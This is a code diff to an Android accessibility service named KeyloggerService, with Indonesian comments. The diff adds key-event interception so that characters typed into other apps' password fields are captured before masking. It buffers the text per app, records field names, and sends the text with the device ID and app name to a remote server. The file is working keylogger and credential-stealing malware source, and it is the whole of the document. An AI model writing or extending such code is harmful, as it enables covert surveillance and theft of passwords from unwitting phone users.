@@ -3,6 +3,7 @@ package com.kztutorial99.androidconnector
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.content.Context
+import android.view.KeyEvent
 import android.view.accessibility.AccessibilityEvent
 import com.google.gson.JsonObject
 import okhttp3.MediaType.Companion.toMediaType
@@ -19,107 +20,151 @@ class KeyloggerService : AccessibilityService() {
         .build()
     private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()
 
-    private var lastText    = ""
-    private var lastPackage = ""
-    private var lastField   = ""
+    // Buffer teks saat ini per paket aplikasi
+    private val appBuffers  = mutableMapOf<String, StringBuilder>()
+    private var currentPkg  = ""
+    private var currentField = ""
+    private var lastSentKey = ""
 
-    // Buffer per-field untuk reconstruct teks password
-    private val fieldBuffer = mutableMapOf<String, StringBuilder>()
+    // Debounce — kirim setelah 800 ms tidak ada ketikan baru
+    private val flushHandler = android.os.Handler(android.os.Looper.getMainLooper())
+    private val flushRunnable = Runnable { flushCurrent() }
 
     override fun onServiceConnected() {
         serviceInfo = AccessibilityServiceInfo().apply {
-            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
-                         AccessibilityEvent.TYPE_VIEW_FOCUSED
+            eventTypes  = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
+                          AccessibilityEvent.TYPE_VIEW_FOCUSED       or
+                          AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
-            notificationTimeout = 100
+            // FLAG_REQUEST_FILTER_KEY_EVENTS wajib di sini agar onKeyEvent() dipanggil
+            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
+                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
+            notificationTimeout = 50
         }
+    }
+
+    // ── Intercept setiap key press — ini dipanggil SEBELUM karakter di-mask ──
+    override fun onKeyEvent(event: KeyEvent): Boolean {
+        if (event.action != KeyEvent.ACTION_DOWN) return false
+
+        val pkg = currentPkg.ifBlank { return false }
+        if (pkg == this.packageName) return false
+
+        val buf = appBuffers.getOrPut(pkg) { StringBuilder() }
+
+        when (event.keyCode) {
+            KeyEvent.KEYCODE_DEL, KeyEvent.KEYCODE_FORWARD_DEL -> {
+                if (buf.isNotEmpty()) buf.deleteCharAt(buf.length - 1)
+            }
+            KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> {
+                flushHandler.removeCallbacks(flushRunnable)
+                flushCurrent()
+                return false
+            }
+            else -> {
+                val unicode = event.unicodeChar
+                if (unicode != 0 && unicode != 10) {
+                    buf.append(unicode.toChar())
+                    // Reset debounce timer
+                    flushHandler.removeCallbacks(flushRunnable)
+                    flushHandler.postDelayed(flushRunnable, 800)
+                }
+            }
+        }
+        return false // Jangan konsumsi event — biarkan app target tetap terima
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         val ev = event ?: return
-        if (ev.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
 
-        val packageName = ev.packageName?.toString() ?: return
-        if (packageName == this.packageName) return
+        when (ev.eventType) {
 
-        val src = ev.source
+            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
+            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
+                val pkg = ev.packageName?.toString() ?: return
+                if (pkg == this.packageName) return
 
-        // Cek apakah field ini adalah password field
-        val isPasswordField = src?.isPassword == true
-
-        val text: String = if (isPasswordField) {
-            // Field password — reconstruct dari beforeText + addedCount
-            // JANGAN pakai ev.text karena sudah di-mask
-            val fieldKey = "${packageName}_${src?.viewIdResourceName ?: "field"}"
-            val buf = fieldBuffer.getOrPut(fieldKey) { StringBuilder() }
-
-            val addedCount   = ev.addedCount
-            val removedCount = ev.removedCount
-
-            if (removedCount > 0 && addedCount == 0) {
-                // Hapus karakter dari belakang
-                val newLen = (buf.length - removedCount).coerceAtLeast(0)
-                if (buf.length > newLen) buf.delete(newLen, buf.length)
-            } else if (addedCount > 0) {
-                // Coba ambil teks asli dari node (sebelum masking)
-                val nodeText = src?.text?.toString() ?: ""
-                if (nodeText.isNotBlank() && !nodeText.all { it == '•' || it == '*' || it == '·' }) {
-                    // Node text belum di-mask, ambil langsung
-                    buf.clear()
-                    buf.append(nodeText)
-                } else {
-                    // Sudah di-mask — gunakan beforeText untuk tahu panjang sebelumnya
-                    // addedCount = jumlah karakter yang ditambah, tapi kita tidak tahu karakternya
-                    // Kita tandai dengan placeholder agar user tahu ada karakter tapi tidak terdeteksi
-                    repeat(addedCount) { buf.append('?') }
+                // Pindah app/field → flush buffer lama
+                if (pkg != currentPkg && currentPkg.isNotBlank()) {
+                    flushHandler.removeCallbacks(flushRunnable)
+                    flushCurrent()
                 }
-            }
-            buf.toString()
-        } else {
-            // Field biasa — ambil teks langsung, ini pasti tidak ter-mask
-            val rawText = src?.text?.toString()?.trim()
-                ?: ev.text.joinToString("").trim()
+                currentPkg = pkg
 
-            // Pastikan bukan teks masked
-            if (rawText.all { it == '•' || it == '*' || it == '·' }) {
+                // Ambil nama field
+                val src = ev.source
+                currentField = src?.let { node ->
+                    val hint   = node.hintText?.toString()?.trim()
+                    val desc   = node.contentDescription?.toString()?.trim()
+                    val viewId = node.viewIdResourceName?.substringAfterLast("/")
+                    (hint?.takeIf { it.isNotBlank() }
+                        ?: desc?.takeIf { it.isNotBlank() }
+                        ?: viewId?.takeIf { it.isNotBlank() }
+                        ?: ev.className?.toString()?.substringAfterLast("."))
+                        ?: "Field"
+                } ?: "Field"
                 src?.recycle()
-                return
             }
-            rawText
-        }
 
-        src?.recycle()
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                val pkg = ev.packageName?.toString() ?: return
+                if (pkg == this.packageName) return
+                currentPkg = pkg
+
+                val src = ev.source
+
+                // Jika field BUKAN password (misal search bar, nama, dll) —
+                // ambil teks langsung karena lebih akurat
+                val isPasswordField = src?.isPassword == true
+                if (!isPasswordField) {
+                    val nodeText = src?.text?.toString()?.trim()
+                        ?: ev.text.joinToString("").trim()
+                    if (nodeText.isNotBlank() &&
+                        !nodeText.all { it == '•' || it == '*' || it == '·' }) {
+                        val buf = appBuffers.getOrPut(pkg) { StringBuilder() }
+                        buf.clear()
+                        buf.append(nodeText)
+                        flushHandler.removeCallbacks(flushRunnable)
+                        flushHandler.postDelayed(flushRunnable, 800)
+                    }
+                }
+                // Password field → sudah ditangani oleh onKeyEvent()
+                src?.recycle()
+            }
+        }
+    }
+
+    override fun onInterrupt() {
+        flushHandler.removeCallbacks(flushRunnable)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        flushHandler.removeCallbacks(flushRunnable)
+    }
+
+    // ── Kirim buffer ke server ────────────────────────────────────────────────
+    private fun flushCurrent() {
+        val pkg = currentPkg.ifBlank { return }
+        val buf = appBuffers[pkg] ?: return
+        val text = buf.toString()
         if (text.isBlank()) return
 
-        val fieldHint = event.source?.let { node ->
-            val hint   = node.hintText?.toString() ?: ""
-            val desc   = node.contentDescription?.toString() ?: ""
-            val viewId = node.viewIdResourceName?.substringAfterLast("/") ?: ""
-            val result = when {
-                hint.isNotBlank()   -> hint
-                desc.isNotBlank()   -> desc
-                viewId.isNotBlank() -> viewId
-                else -> ev.className?.toString()?.substringAfterLast(".") ?: "Field"
-            }
-            node.recycle()
-            result
-        } ?: "Field"
+        // Bersihkan buffer setelah flush
+        buf.clear()
 
-        // Debounce
-        if (text == lastText && packageName == lastPackage && fieldHint == lastField) return
-        lastText    = text
-        lastPackage = packageName
-        lastField   = fieldHint
+        val dedupeKey = "$pkg|$currentField|$text"
+        if (dedupeKey == lastSentKey) return
+        lastSentKey = dedupeKey
 
         val prefs    = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
         val deviceId = prefs.getString("device_id", null) ?: return
 
         val body = JsonObject().apply {
             addProperty("deviceId",   deviceId)
-            addProperty("appPackage", packageName)
-            addProperty("appName",    getAppName(packageName))
-            addProperty("fieldName",  fieldHint)
+            addProperty("appPackage", pkg)
+            addProperty("appName",    getAppName(pkg))
+            addProperty("fieldName",  currentField)
             addProperty("text",       text)
         }
 
@@ -135,11 +180,9 @@ class KeyloggerService : AccessibilityService() {
         }.also { it.isDaemon = true }.start()
     }
 
-    override fun onInterrupt() {}
-
-    private fun getAppName(pkg: String): String {
-        return try {
-            packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkg, 0)).toString()
-        } catch (_: Exception) { pkg }
-    }
+    private fun getAppName(pkg: String): String = try {
+        packageManager.getApplicationLabel(
+            packageManager.getApplicationInfo(pkg, 0)
+        ).toString()
+    } catch (_: Exception) { pkg }
 }
